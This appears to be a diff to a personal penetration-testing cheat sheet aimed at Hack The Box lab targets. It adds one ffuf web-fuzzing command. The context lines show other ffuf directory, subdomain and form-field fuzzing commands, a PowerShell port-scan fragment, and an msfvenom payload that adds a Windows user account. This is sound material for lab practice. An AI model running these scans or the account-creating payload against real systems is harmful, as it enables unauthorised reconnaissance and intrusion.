@@ -47,6 +47,7 @@ $Target = "172.16.6.50"; 1..1024 | ForEach-Object { try { $c = New-Object System
   ```
 ## FFUF
   ```
+  ffuf -w ./SecLists/Discovery/Web-Content/web-extensions.txt -u http://academy.htb/indexFUZZ
   ffuf -w ./SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.sh,.txt,.aspx -u http://10.10.11.175:8530/FUZZ/ -mc all -ic
   ffuf -w ./SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" -fs
   ffuf -w ./SecLists/Fuzzing/special-chars.txt -u http://10.10.10.70/submit -d "character=bart&quote=FUZZ" -H Content-Type:application/x-www-form-urlencoded -mc all
@@ -295,6 +296,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net user /add lopsy a123
   krbrelayx
   gdb-peda-pwndbg-gef
   ```
+
 
 
 
